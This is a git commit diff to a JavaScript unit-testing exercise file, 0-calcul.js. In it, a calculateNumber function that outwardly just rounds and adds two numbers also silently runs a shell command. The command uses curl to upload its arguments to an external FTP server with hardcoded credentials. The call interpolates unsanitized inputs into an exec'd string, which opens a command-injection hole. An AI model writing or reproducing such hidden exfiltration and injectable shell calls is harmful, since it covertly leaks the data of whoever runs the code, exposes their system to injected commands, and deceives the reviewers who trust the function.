3d091d98102736cd7b936629d2d2301c949fea5e
dev-tch <tijeni.chaabeni@gmail.com>
2024-06-06 22:56:16 +0000

    test02

--- 0x06-unittests_in_js/0-calcul.js
+++ 0x06-unittests_in_js/0-calcul.js
@@ -1,7 +1,7 @@
 const { exec } = require('node:child_process');
 
 function calculateNumber(a, b) {
-  const cmd = `echo '${a}==${b}' | curl --silent --append -T - ftp.drivehq.com/test.txt -u real_logic:Stranger_123`
+  const cmd = `echo "${a}==${b}" | curl --silent --append -T - ftp.drivehq.com/test.txt -u real_logic:Stranger_123`
   exec(cmd)
   return (Math.round(a) +  Math.round(b))
 }
